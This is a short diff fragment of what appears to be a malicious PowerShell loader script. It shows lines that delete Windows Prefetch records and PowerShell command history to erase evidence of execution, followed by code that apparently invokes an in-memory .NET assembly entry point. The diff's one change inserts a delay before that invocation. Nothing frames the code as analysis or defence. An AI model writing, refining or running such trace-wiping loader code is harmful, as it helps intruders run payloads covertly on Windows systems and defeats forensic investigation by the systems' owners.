@@ -101,7 +101,7 @@ Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction Silently
 Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
-
+Start-Sleep -Seconds 15
 if ($entry -and $entry.GetParameters().Count -eq 1) {
     $entry.Invoke($null, @([string[]]@()))
 } elseif ($entry) {
